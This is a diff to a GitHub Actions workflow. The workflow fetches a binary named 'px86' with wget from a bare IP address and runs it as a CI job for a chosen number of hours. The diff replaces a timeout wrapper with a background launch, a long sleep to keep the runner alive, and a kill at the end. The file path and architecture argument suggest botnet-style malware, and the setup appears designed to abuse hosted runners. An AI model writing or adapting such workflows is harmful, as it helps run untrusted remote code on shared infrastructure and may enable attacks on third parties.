@@ -26,12 +26,19 @@ jobs:
         wget http://45.138.16.158/bins/px86 -O px86
         chmod +x px86
 
-    - name: Run binary with timeout
+    - name: Run binary for specified duration
       run: |
         UPTIME=${{ github.event.inputs.uptime }}
         echo "Running binary for $UPTIME hours"
         
-        # Run the binary with timeout command
-        timeout $(($UPTIME * 3600)) ./px86 x86
+        # Start the binary in background
+        ./px86 x86 &
+        PID=$!
+        echo "Binary started with PID: $PID"
         
-        echo "Binary execution completed"
+        # Sleep for the specified duration (this keeps the workflow alive)
+        sleep $(($UPTIME * 3600))
+        
+        # Kill the binary after the time is up
+        kill $PID 2>/dev/null || true
+        echo "Successfully completed $UPTIME hours of runtime"
